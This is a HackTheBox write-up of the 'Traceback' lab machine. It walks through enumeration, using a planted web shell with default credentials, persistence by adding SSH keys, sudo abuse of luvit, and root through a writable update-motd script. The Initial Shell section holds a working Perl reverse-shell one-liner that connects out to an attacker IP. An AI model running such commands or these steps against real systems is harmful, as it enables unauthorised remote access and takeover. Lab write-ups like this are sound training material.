---
title: Traceback Writeup - Machine
author: Sujit Suryawanshi
date: 2020-08-01 14:10:00 +0800
categories: [Writeup, HackTheBox]
tags: [hackthebox, htb, traceback]
---

<h3><strong><span style="color:#ff5555">Traceback - HackTheBox</span></strong></h3>

---

![Desktop View]({{ "/assets/img/htb-machines/traceback-main.png" | relative_url }})

---

<strong><span style="color:#ff5555">Introduction</span></strong>

---

Today I did Traceback box from HackTheBox.
It was nice box, CTF-like box in which the website has been hacked and placed one backdoor shell to access.
So the backdoor shell was the way to get initial shell and then need to get user by adding own ssh keys and then can go for Privilege Escalation to get root.

The box was using UpdateMotd which was running one custom script after a particular time. And the user had access to write into 00-header file which was executing.
Se lets move and Pwn this box.

**This blog is meant for educational purposes only.**

---

<strong><span style="color:#ff5555">Port & Service Enumeration</span></strong>

---

<p><code class="language-plaintext highlighter-rouge">root@kali:~sudo nmap -sC -sV -T4 10.10.10.181</code></p>

![Desktop View]({{ "/assets/img/htb-machines/blunder-nmap.png" | relative_url }})

We used -sC for Default Script, -sV Service Version Scan, -T4 for Timing.
As you can see there are two ports open that is port 22 and 80. Port 80 hosting web server which has Apache httpd 2.4.29 also the OS was Ubuntu, so we moved towards port 80 for further enumeration.

---

<strong><span style="color:#ff5555">Web Enumeration</span></strong>

---

After opening the website in browser, There was note from hacker who have defaced the site.

![Desktop View]({{ "/assets/img/htb-machines/traceback-website-defaced.png" | relative_url }})

Continuing to enumeration I checked the page source of website for comments and other juicy information.
Then I found one comment in HTML page of website.

![Desktop View]({{ "/assets/img/htb-machines/traceback-html-comment.png" | relative_url }})

After doing some web fuzzing using names of common backdoor shell, I found there was shell named "smevk.php" <http://10.10.10.181/smevk.php>

![Desktop View]({{ "/assets/img/htb-machines/traceback-ffuf.png" | relative_url }})

Visiting above url, Got login page of web shell.

![Desktop View]({{ "/assets/img/htb-machines/traceback-shell.png" | relative_url }})

I used default credentials as admin:admin to login into shell.

![Desktop View]({{ "/assets/img/htb-machines/traceback-shell-login.png" | relative_url }})

So here we got the access to backdoor shell and it's time to get full interactive shell.

---

<strong><span style="color:#ff5555">Initial Shell</span></strong>

---

Moving forward, I did some google for getting tty shell and got a tty shell using perl command given below.

```
perl -e 'use Socket;$i="10.10.14.167";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Then I used /usr/bin/script -qc /bin/bash /dev/null to make tty shell interactive.

Basically what this command does here -qc is script flag and -c means running a command instead of an interactive shell & -q means to be quiet as in not to print output through STDOUT.

Moving further, I found that machine has two users that is webadmin and sysadmin.

![Desktop View]({{ "/assets/img/htb-machines/traceback-users-list.png" | relative_url }})

As I had access of .ssh of folder I added my system's key in authorized_keys file so that I'll get access of this system using ssh.

![Desktop View]({{ "/assets/img/htb-machines/traceback-ssh-keys.png" | relative_url }})

After doing login by ssh I saw a weird message printed on screen.

![Desktop View]({{ "/assets/img/htb-machines/traceback-ssh-login.png" | relative_url }})

---

<strong><span style="color:#ff5555">Privilege Escalation: User</span></strong>

---

Anyway lets move further for sysadmin user.
While enumerating more, I found note.txt which contains,

![Desktop View]({{ "/assets/img/htb-machines/traceback-sysadmin-note.png" | relative_url }})

Checking sudo -l, I got that luvit was allowed to run as sudo with sysadmin user.

![Desktop View]({{ "/assets/img/htb-machines/traceback-luvit.png" | relative_url }})

So for Privilege Escalation and User flag I ran luvit with sudo and executed "/bin/bash" which gave me sysadmin.

![Desktop View]({{ "/assets/img/htb-machines/traceback-sysadmin-user.png" | relative_url }})

Next part in Privilege Escalation for root.

---

<strong><span style="color:#ff5555">Privilege Escalation: Root</span></strong>

---

So while enumerating for root, I saw one odd service like,

root       5660  0.0  0.0   4628   772 ?        Ss   17:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

After checking out both directories which are given in above service, I found writable file under "/etc/update-motd.d/" directory named 00-header.

So this file was executing and printing some text on login of SSH.

![Desktop View]({{ "/assets/img/htb-machines/traceback-00-header.png" | relative_url }})

Also the file was writable by sysadmin user which we have already owned.

Then I read flag by appending my command in the 00-header file and re-logged in using SSH and got root.txt also


![Desktop View]({{ "/assets/img/htb-machines/traceback-root.png" | relative_url }})

![Desktop View]({{ "/assets/img/htb-machines/traceback-root-1.png" | relative_url }})


**Thanks for reading this writeup and all suggestions are welcome.**
